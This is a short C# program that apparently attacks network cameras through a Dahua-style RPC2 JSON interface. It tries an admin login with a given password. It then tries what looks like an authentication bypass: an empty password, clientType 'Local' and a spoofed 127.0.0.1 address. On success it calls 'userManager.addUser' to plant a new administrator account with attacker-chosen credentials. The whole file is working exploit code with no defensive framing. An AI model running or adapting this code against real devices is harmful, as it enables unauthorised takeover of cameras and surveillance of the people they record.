using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Net.Http.Json;
using System.Text.Json.Nodes;
using System.Threading.Tasks;

class CameraRpc {
    static readonly HttpClient client = new HttpClient();
    static async Task<JsonObject> Rpc(string url, object message) {
        var response = await client.PostAsJsonAsync(url, message);
        return (await response.Content.ReadFromJsonAsync<JsonObject>())!;
    }
    static async Task Main(string[] args) {
        var candidates = new [] {
            new Dictionary<string, object> {
                {"userName", "admin"}, {"password", "provided-password"},
                {"clientType", "Web3.0"}, {"loginType", "Direct"}
            },
            new Dictionary<string, object> {
                {"userName", "admin"}, {"password", ""}, {"clientType", "Local"},
                {"loginType", "Direct"}, {"ipAddr", "127.0.0.1"}
            }
        };
        foreach (var parameters in candidates) {
            var result = await Rpc(args[0] + "/RPC2_Login", new {
                method = "global.login", @params = parameters, id = 1, session = 0
            });
            if (result["result"]?.GetValue<bool>() == true && result["session"] != null) {
                await Rpc(args[0] + "/RPC2", new {
                    method = "userManager.addUser", @params = new {user = new {
                        Name = args[1], Password = args[2], Group = "admin", Encryption = "Plain"
                    }}, id = 2, session = result["session"]!.GetValue<long>()
                });
                break;
            }
        }
    }
}
